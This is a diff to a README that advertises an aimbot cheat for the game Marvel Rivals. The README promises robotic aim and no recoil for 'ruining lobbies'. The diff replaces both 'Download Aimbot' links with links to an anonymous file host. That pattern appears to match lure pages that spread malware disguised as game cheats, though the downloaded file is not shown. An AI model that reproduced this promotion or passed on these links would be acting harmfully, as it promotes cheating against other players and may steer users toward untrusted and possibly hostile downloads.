@@ -4,14 +4,14 @@
 
 **Marvel Rivals** is pure chaos: third-person team brawls, explosive powers, high-speed aim duels. If you want to climb the ranks or just ruin lobbies, you need a cheat that takes your **aim from average to robotic**. The **Marvel Rivals Aimbot** is that cheat—offering **perfect tracking, no-recoil shots, and head-snapping precision** built for PvP dominance. 💥
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/marvel-rivals/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🎮 What Is Marvel Rivals?
 
 A fast-paced 6v6 hero shooter with some of Marvel’s most iconic characters. From Iron Man to Magneto, each hero brings unique skills, movement, and firepower. But aiming is still the core of every fight—**and if you can’t hit, you can’t win**. That’s where aimbot comes in 🔧
 
-[![Download Aimbot](https://www.systemcheats.net/wp-content/uploads/2024/12/MarvelRivals-Screenshot-2-1024x576.jpg)](https://wecheaters.github.io/cheats/marvel-rivals/)
+[![Download Aimbot](https://www.systemcheats.net/wp-content/uploads/2024/12/MarvelRivals-Screenshot-2-1024x576.jpg)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🔥 Aimbot Features
